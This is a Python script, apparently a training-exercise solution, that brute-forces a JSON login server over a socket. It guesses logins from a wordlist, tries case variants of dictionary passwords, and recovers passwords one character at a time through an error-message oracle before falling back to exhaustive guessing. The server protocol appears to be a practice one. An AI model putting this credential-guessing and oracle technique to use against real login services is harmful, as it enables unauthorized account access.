# write your code here
import socket
import sys
import itertools
import string
import json

found_password = None
found_substring = None
found_login = None
blocked = False


def brute_force_password():
    global found_password, blocked

    for length in range(1, 5):

        symbols = itertools.chain(string.ascii_lowercase, string.digits)
        permutations = itertools.product(symbols, repeat=length)

        for permutation in permutations:

            password = ''.join(permutation)

            found_password = try_password(password)

            if found_password or blocked:
                return found_password

    return found_password


def try_password_dictionary(file_path):
    global found_password, blocked

    with open(file_path, "r") as pw_file:
        for line in pw_file:
            permute_case_and_test(list(line.strip()), 0)

    return found_password


def permute_case_and_test(char_list, permutation_index):
    global found_password, blocked

    char_list[permutation_index] = char_list[permutation_index].lower()

    if permutation_index == len(char_list) - 1:
        found_password = try_password("".join(char_list))

        if found_password or blocked:
            return found_password
    else:
        permute_case_and_test(char_list, permutation_index + 1)

    char_list[permutation_index] = char_list[permutation_index].upper()

    if permutation_index == len(char_list) - 1:
        found_password = try_password("".join(char_list))

        if found_password or blocked:
            return found_password
    else:
        permute_case_and_test(char_list, permutation_index + 1)

    return found_password


def brute_force_password_substrings():
    global found_password, blocked

    char_list = []

    for index in range(0, 20):

        symbols = itertools.chain(string.ascii_lowercase, string.ascii_uppercase, string.digits)

        char_list.append("")

        for symbol in symbols:

            char_list[index] = symbol

            password = "".join(char_list)
            found_password = try_password("".join(char_list))

            if found_password or blocked:
                return found_password
            if found_substring == password:
                break

    return found_password


def try_password(password):
    global found_login, found_password, found_substring, blocked, client_socket

    login_dict = {"login": found_login, "password": password}
    login_json = json.dumps(login_dict, indent=4)

    client_socket.send(login_json.encode())
    response = json.loads(client_socket.recv(1024).decode())

    if response["result"] == "Connection success!":
        found_password = password
        print(login_json)
        # print(password)
    elif response["result"] == "Exception happened during login":
        found_substring = password
    elif response["result"] == "Too many attempts":
        blocked = True

    return found_password


def try_login_dictionary(file_path):
    global found_login, blocked

    with open(file_path, "r") as login_file:
        for login in login_file:
            found_login = try_login(login.strip())
            if found_login or blocked:
                return found_login

    return found_login


def try_login(login):
    global found_login, blocked, client_socket

    login_dict = {"login": login, "password": ""}
    login_json = json.dumps(login_dict, indent=4)

    client_socket.send(login_json.encode())
    response = json.loads(client_socket.recv(1024).decode())

    if response["result"] == "Wrong password!" or response["result"] == "Exception happened during login":
        found_login = login
        # print(login)
    elif response["result"] == "Too many attempts":
        blocked = True

    return found_login


# run program
if not 2 < len(sys.argv) < 6:
    print("illegal parameters")
else:
    ip_address = sys.argv[1]
    port = int(sys.argv[2])
    if len(sys.argv) == 5:
        password_input = sys.argv[3]
        login_input = sys.argv[4]
    else:
        password_input = None
        login_input = None
    with socket.socket() as client_socket:
        try:
            # print(ip_address, port)
            client_socket.connect((ip_address, port))

            if password_input and login_input:
                found_login = try_login(login_input)
                if found_login:
                    found_password = try_password(password_input)
            if not (found_password or blocked):
                found_login = try_login_dictionary(".\\hacking\\logins.txt")
                if found_login:
                    found_password = try_password_dictionary(".\\hacking\\passwords.txt")
                    if not (found_password or blocked):
                        found_password = brute_force_password_substrings()
                    if not (found_password or blocked):
                        found_password = brute_force_password()

        except ConnectionError:
            print("Connection Error")
